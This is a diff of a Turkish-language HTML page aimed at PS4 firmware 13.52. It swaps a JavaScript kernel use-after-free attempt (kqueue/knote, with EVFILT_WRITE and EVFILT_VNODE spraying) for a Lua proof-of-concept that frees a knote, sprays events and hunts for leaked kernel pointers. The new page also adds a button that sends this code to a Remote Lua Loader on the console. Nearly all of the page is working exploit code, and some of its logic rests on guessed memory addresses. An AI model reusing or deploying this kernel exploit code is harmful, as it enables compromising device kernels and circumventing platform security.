@@ -2,185 +2,135 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 13.52 - TEST EDİLMEYEN YAKLAŞIM</title>
+    <title>PS4 13.52 - Kernel UAF Çalıştırıcı</title>
     <style>
-        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { white-space: pre-wrap; word-wrap: break-word; max-height: 90vh; overflow-y: auto; }
-        .info { color: #6cf; }
+        body { background: #0a0a0a; color: #00ffcc; font-family: monospace; padding: 20px; }
+        textarea { width: 100%; height: 300px; background: #1a1a1a; color: #0f0; border: 1px solid #00ffcc; padding: 10px; font-family: monospace; font-size: 13px; }
+        button { background: #00ffcc; color: #000; border: none; padding: 12px 24px; font-size: 18px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #00ddbb; }
+        #status { margin-top: 20px; padding: 10px; background: #1a1a1a; border: 1px solid #444; }
         .ok { color: #0f0; }
         .err { color: #f44; }
-        .warn { color: #fa0; }
+        .info { color: #6cf; }
     </style>
 </head>
 <body>
-    <h1>🧪 PS4 13.52 - Yeni Yaklaşım (EVFILT_WRITE + VNODE Spray)</h1>
-    <div id="log">[+] Başlatılıyor...</div>
+    <h1>🧪 PS4 13.52 - Kernel UAF (kqueue/knote)</h1>
+    <p>Bu sayfa, Remote Lua Loader üzerinden PS4'te Lua kodunu çalıştırır.</p>
+    <p><span class="info">NOT:</span> Remote Lua Loader'ın çalışıyor olması gerekir.</p>
+
+    <h3>Lua Kodu (sa.txt'den alınmıştır)</h3>
+    <textarea id="luaCode" readonly>
+-- ps4_uaf_confirm.lua
+local S = rawget(_G, "syscall")
+local M = rawget(_G, "memory")
+
+S.resolve({ kqueue=362, kevent=363, pipe=42, close=6, write=4, read=3 })
+
+local function mkkevent(filter, ident, flags, fflags, data, udata)
+    local ev = M.alloc(32)
+    M.write_qword(ev+0, ident)
+    M.write_word(ev+8, filter)
+    M.write_word(ev+10, flags)
+    M.write_dword(ev+12, fflags or 0)
+    M.write_qword(ev+16, data or 0)
+    M.write_qword(ev+24, udata or 0)
+    return ev
+end
+
+print("[*] kqueue knote UAF PoC - PS4 FW 13.52")
+
+local kq = S.kqueue()
+print("[+] kqueue fd: " .. kq)
+
+local pbuf = M.alloc(16)
+S.pipe(pbuf)
+local rd = M.read_dword(pbuf):tonumber()
+local wr = M.read_dword(pbuf+4):tonumber()
+print("[+] pipe rd=" .. rd .. " wr=" .. wr)
+
+local ev = mkkevent(0xFFFF, rd, 0x0005, 0, 0, 0)
+local changes = mkkevent(0xFFFF, rd, 0x0005, 0, 0, 0)
+local r = S.kevent(kq, changes, 1, ev, 1, 0)
+print("[+] EVFILT_READ kaydedildi: " .. r)
+
+print("[*] EVFILT_USER spray (50)...")
+for i=1,50 do
+    local uev = mkkevent(0xFFF9, i, 0x0005, 0, 0, i)
+    S.kevent(kq, uev, 1, nil, 0, 0)
+end
+print("[+] Spray tamamlandı")
+
+S.close(rd); S.close(wr)
+print("[+] Pipe kapatıldı - knote freed")
+
+local outbuf = M.alloc(2560)
+local nevents = S.kevent(kq, nil, 0, outbuf, 100, 0)
+print("[+] kevent okudu: " .. nevents .. " event")
+
+if nevents and nevents > 0 then
+    local kptrs = 0
+    for i=0, nevents-1 do
+        local off = i*32
+        local ident = M.read_qword(outbuf+off):tonumber()
+        local udata = M.read_qword(outbuf+off+24):tonumber()
+        if ident > 0xFFFF000000000000 then
+            kptrs = kptrs + 1
+            print("[!] KERNEL PTR ident["..i.."]: 0x"..string.format("%x", ident))
+        end
+        if udata > 0xFFFF000000000000 then
+            kptrs = kptrs + 1
+            print("[!] KERNEL PTR udata["..i.."]: 0x"..string.format("%x", udata))
+        end
+    end
+    if kptrs == 0 then
+        print("[!] Kernel pointer bulunamadı. Sony temizlemiş.")
+    else
+        print("[+] " .. kptrs .. " kernel pointer bulundu!")
+    end
+end
+print("[*] PoC tamamlandı")
+    </textarea>
+
+    <br><br>
+    <label>PS4 IP Adresi: <input type="text" id="ps4ip" value="192.168.1.100" style="background:#1a1a1a;color:#0f0;border:1px solid #00ffcc;padding:8px;width:200px;"></label>
+    <br><br>
+    <button id="runBtn">▶️ Lua Kodunu Çalıştır</button>
+
+    <div id="status">[+] Hazır</div>
+
     <script>
-        // ==================================================
-        // 1. Varsayılan native fonksiyonlar (WebKit RCE ile doldurulur)
-        // ==================================================
-        const nativeCall = window.nativeCall || function() { console.error("nativeCall eksik"); return -1; };
-        const memAlloc = window.memoryAlloc || function(s) { console.error("memoryAlloc eksik"); return 0; };
-        const memWrite = window.memoryWrite || function(a,o,v,s) { console.error("memoryWrite eksik"); };
-        const memRead = window.memoryRead || function(a,s) { console.error("memoryRead eksik"); return 0; };
+        document.getElementById('runBtn').addEventListener('click', function() {
+            const ip = document.getElementById('ps4ip').value.trim();
+            const lua = document.getElementById('luaCode').value;
+            const status = document.getElementById('status');
 
-        // ==================================================
-        // 2. Syscall numaraları
-        // ==================================================
-        const SYS = {
-            kqueue: 362,
-            kevent: 363,
-            pipe: 42,
-            close: 6,
-            write: 4,
-            read: 3,
-            socket: 97,      // AF_INET
-            connect: 98,
-            fcntl: 92,
-            ioctl: 54,
-        };
-
-        // ==================================================
-        // 3. Kevent oluşturucu
-        // ==================================================
-        function make_kevent(ident, filter, flags, fflags, data, udata) {
-            const ev = memAlloc(32);
-            if (!ev) return 0;
-            memWrite(ev, 0, ident, 8);
-            memWrite(ev, 8, filter, 2);
-            memWrite(ev, 10, flags, 2);
-            memWrite(ev, 12, fflags || 0, 4);
-            memWrite(ev, 16, data || 0, 8);
-            memWrite(ev, 24, udata || 0, 8);
-            return ev;
-        }
-
-        function syscall(num, ...args) {
-            return nativeCall(num, ...args);
-        }
-
-        // ==================================================
-        // 4. Yeni Yaklaşım: EVFILT_WRITE ile UAF
-        //    + Farklı spray (EVFILT_VNODE)
-        // ==================================================
-        function trigger_new_uaf() {
-            log("[*] Yeni yaklaşım başlatılıyor: EVFILT_WRITE + VNODE spray", "info");
-
-            // 4.1 kqueue
-            const kq = syscall(SYS.kqueue);
-            if (kq < 0) { log("[!] kqueue hata: " + kq, "err"); return false; }
-            log("[+] kqueue = " + kq, "ok");
-
-            // 4.2 pipe oluştur
-            const pbuf = memAlloc(8);
-            if (!pbuf) { log("[!] pipe buffer tahsisi başarısız", "err"); return false; }
-            const pret = syscall(SYS.pipe, pbuf);
-            if (pret < 0) { log("[!] pipe hata: " + pret, "err"); return false; }
-            const rd = memRead(pbuf, 4);
-            const wr = memRead(pbuf + 4, 4);
-            log("[+] pipe rd=" + rd + " wr=" + wr, "ok");
-
-            // 4.3 EVFILT_WRITE kaydet (knote K1) - belgede READ vardı, şimdi WRITE
-            // EVFILT_WRITE = -2 (0xFFFE)
-            const ev = make_kevent(wr, 0xFFFE, 0x0005, 0, 0, 0);
-            if (!ev) { log("[!] kevent oluşturulamadı", "err"); return false; }
-            const r1 = syscall(SYS.kevent, kq, ev, 1, 0, 0, 0);
-            log("[+] EVFILT_WRITE kaydedildi: " + r1, "ok");
-
-            // 4.4 FARKLI SPRAY: EVFILT_VNODE kullan (belgede sadece USER test edilmiş)
-            // EVFILT_VNODE = -4 (0xFFFC) - PS4'te çalışıyor mu? Deneyelim.
-            log("[*] EVFILT_VNODE ile spray başlıyor (30 adet)...", "info");
-            const SPRAY_COUNT = 30;
-            // VNODE için bir dosya tanımlayıcı lazım, örneğin /dev/null açalım
-            // PS4'te /dev/null açmak için open syscall (5) kullanılır, ama sandbox izin verir mi?
-            // Deneyelim: open("/dev/null", O_RDWR)
-            const null_fd = syscall(5, 0x100000, 2, 0); // 0x100000 = "/dev/null" string adresi (varsayıyoruz)
-            if (null_fd < 0) {
-                log("[!] /dev/null açılamadı, VNODE spray atlanıyor.", "warn");
-            } else {
-                for (let i = 1; i <= SPRAY_COUNT; i++) {
-                    // EVFILT_VNODE = -4
-                    const vn_ev = make_kevent(null_fd, 0xFFFC, 0x0005, 0, 0, i);
-                    if (vn_ev) {
-                        syscall(SYS.kevent, kq, vn_ev, 1, 0, 0, 0);
-                    }
-                }
-                log("[+] EVFILT_VNODE spray tamamlandı.", "ok");
-            }
-
-            // 4.5 Şimdi write ucunu kapatalım - EVFILT_WRITE knotesu serbest kalır
-            syscall(SYS.close, wr);
-            log("[+] Pipe write ucu kapatıldı (wr=" + wr + ") - knote freed", "warn");
-
-            // 4.6 Hemen kevent oku (race yok, doğrudan)
-            const outbuf = memAlloc(3200); // 100 event
-            if (!outbuf) { log("[!] outbuf tahsisi başarısız", "err"); return false; }
-            const nevents = syscall(SYS.kevent, kq, 0, 0, outbuf, 100, 0);
-            log("[+] kevent okuma tamamlandı, event sayısı: " + nevents, "info");
-
-            // 4.7 Kernel pointer ara
-            let kptrs = 0;
-            if (nevents > 0) {
-                for (let i = 0; i < nevents; i++) {
-                    const off = i * 32;
-                    const ident = memRead(outbuf + off, 8);
-                    const udata = memRead(outbuf + off + 24, 8);
-                    if (ident > 0xFFFF000000000000) {
-                        kptrs++;
-                        log("[!] KERNEL PTR ident[" + i + "]: 0x" + ident.toString(16), "err");
-                    }
-                    if (udata > 0xFFFF000000000000) {
-                        kptrs++;
-                        log("[!] KERNEL PTR udata[" + i + "]: 0x" + udata.toString(16), "err");
-                    }
-                }
-            }
-            if (kptrs === 0) {
-                log("[!] Yine kernel pointer yok. Sony temizlemiş.", "warn");
-                log("[*] Farklı bir yaklaşım deneyin: ioctl veya socket ile.", "warn");
-            } else {
-                log("[+] " + kptrs + " kernel pointer bulundu! İlerleme kaydedildi.", "ok");
-            }
-
-            // 4.8 Temizlik
-            syscall(SYS.close, kq);
-            if (null_fd >= 0) syscall(SYS.close, null_fd);
-            return true;
-        }
-
-        // ==================================================
-        // 5. Log
-        // ==================================================
-        const logDiv = document.getElementById('log');
-        function log(msg, type = 'info') {
-            const colors = { info: '#6cf', ok: '#0f0', err: '#f44', warn: '#fa0' };
-            const span = document.createElement('span');
-            span.style.color = colors[type] || '#fff';
-            span.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg + '\n';
-            logDiv.appendChild(span);
-            logDiv.scrollTop = logDiv.scrollHeight;
-            console.log(msg);
-        }
-
-        // ==================================================
-        // 6. Başlat
-        // ==================================================
-        window.onload = function() {
-            log("[*] PS4 13.52 - Test Edilmeyen Yaklaşım", "info");
-            log("[*] EVFILT_WRITE + EVFILT_VNODE spray", "info");
-            if (typeof window.nativeCall !== 'function') {
-                log("[!] nativeCall tanımlı değil! WebKit RCE gerekli.", "err");
-                log("[!] Bu sayfa tek başına çalışmaz.", "err");
+            if (!ip) {
+                status.innerHTML = '<span class="err">❌ Lütfen PS4 IP adresini girin.</span>';
                 return;
             }
-            setTimeout(() => {
-                try {
-                    trigger_new_uaf();
-                } catch (e) {
-                    log("[!] Hata: " + e.message, "err");
+
+            const url = 'http://' + ip + ':1337/run'; // Remote Lua Loader varsayılan portu
+            status.innerHTML = '<span class="info">⏳ Lua kodu gönderiliyor... (' + url + ')</span>';
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'text/plain' },
+                body: lua
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('HTTP ' + response.status);
                 }
-            }, 2000);
-        };
+                return response.text();
+            })
+            .then(data => {
+                status.innerHTML = '<span class="ok">✅ Lua kodu çalıştırıldı! Yanıt:<br><pre>' + data + '</pre></span>';
+            })
+            .catch(err => {
+                status.innerHTML = '<span class="err">❌ Hata: ' + err.message + '<br>Remote Lua Loader çalışıyor mu? PS4 IP doğru mu?</span>';
+            });
+        });
     </script>
 </body>
 </html>
